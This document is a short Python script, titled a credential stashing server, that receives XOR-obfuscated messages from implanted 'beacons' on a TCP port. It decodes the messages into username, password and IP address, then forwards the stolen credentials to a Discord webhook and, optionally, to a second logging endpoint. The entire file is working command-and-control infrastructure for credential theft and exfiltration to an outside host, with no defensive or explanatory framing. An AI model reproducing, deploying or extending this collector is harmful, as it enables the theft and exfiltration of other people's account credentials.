### Simple Python Credential Stashing Server ###
import socket
import json
import threading
import requests
import os
from dotenv import load_dotenv
load_dotenv()

url=os.getenv("WEBHOOK")
key=os.getenv("XOR_KEY", "bingus")
port=os.getenv("PORT",8000)
sawmill_url=os.getenv("SAWMILLURL")

# From GeeksForGeeks <3
def xor_decrypt(inpString):
 
    # calculate length of input string
    length = len(inpString);
 
    # perform XOR operation with key + cipher
    key_length = len(key)
    for i in range(length):
        i_key = i % key_length
        inpString = (inpString[:i] + chr(ord(inpString[i]) ^ ord(key[i_key])) + inpString[i + 1:]);
    return inpString;


def fwd_discord(msg):
    # Format the string
    split_msg = msg.strip(" ") 
    split_msg = msg.split(":")
    split_msg[2] = split_msg[2].strip("\n")
    formatted_msg = (f"{split_msg[2]} | {split_msg[0]}:{split_msg[1]}")
    print(f"Sending : {formatted_msg}")

    # Setup Post Request
    post = {}
    data = {
        "content" : formatted_msg,
        "username" : "Retriever"
    }

    # Send and check result
    try:
        result = requests.post(url, json = data)
        result.raise_for_status()
    except requests.exceptions.HTTPError as err:
        print(err)
    except requests.exceptions.MissingSchema as nourl:
        print("No URL provided : Skipping Webhook")
    else:
        print("Payload delivered successfully, code {}.".format(result.status_code))


def fwd_sawmill(msg):
    # Format the string
    split_msg = msg.strip(" ") 
    split_msg = msg.split(":")
    split_msg[2] = split_msg[2].strip("\n")
    # 2 is IP, 0 is username, 1 is password
    ip = split_msg[2]
    user = split_msg[0]
    pwd = split_msg[1]

    data = {}
    data["ip"] = ip
    data["credentials"] = user + ":" + pwd

    payload = json.dumps(data)
     # Send and check result
    try:
        result = requests.post(sawmill_url, json = payload)
        result.raise_for_status()
    except requests.exceptions.HTTPError as err:
        print(err)
    except requests.exceptions.MissingSchema as nourl:
        print("No Sawmill_URL provided : Skipping Webhook")
    else:
        print("Payload delivered successfully, code {}.".format(result.status_code))

# Handle the sockets coming from the beacons
def handle(client_sock, addr):
    # Read the message
    msg_from_client = client_sock.recv(1024)
    msg = msg_from_client.decode()

    # Decrypt the Message
    msg = xor_decrypt(msg)
    
    # Send to Discord
    fwd_discord(msg)

    #send to Sawmill
    #fwd_sawmill(msg)
    return()


def main():
    # Check for Webhook
    if not url:
       print("# Webhook URL Missing #")

    # Create Socket & Listen
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.bind(("", int(port)))
    server_sock.listen()
    print(f"Server Is Listening on Port {port}\n    Key : {key}")

    # Listen for connections loop
    while True:
        (client_sock, addr) = server_sock.accept() #Blockin`
        thread = threading.Thread(target = handle, args = (client_sock,addr,))
        thread.start()
        thread.join()
        client_sock.close()
    
main()
